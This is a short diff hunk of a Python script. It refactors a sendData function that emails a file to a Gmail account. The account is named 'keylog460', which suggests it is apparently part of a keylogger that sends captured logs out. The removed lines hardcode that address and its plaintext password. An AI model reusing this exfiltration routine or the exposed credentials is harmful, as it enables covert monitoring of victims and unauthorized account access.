@@ -5,10 +5,10 @@ from email.mime.base import MIMEBase
 import time
 from email import encoders
  
-def sendData(fileName):
-	fromaddr = "keylog460@gmail.com"
-	toaddr = "keylog460@gmail.com"
-	passw = "TheAllSpark"
+def sendData(fileName, addr, password):
+	fromaddr = addr
+	toaddr = addr
+	passw = password
 	msg = MIMEMultipart()
 	msg['From'] = fromaddr
 	msg['To'] = toaddr
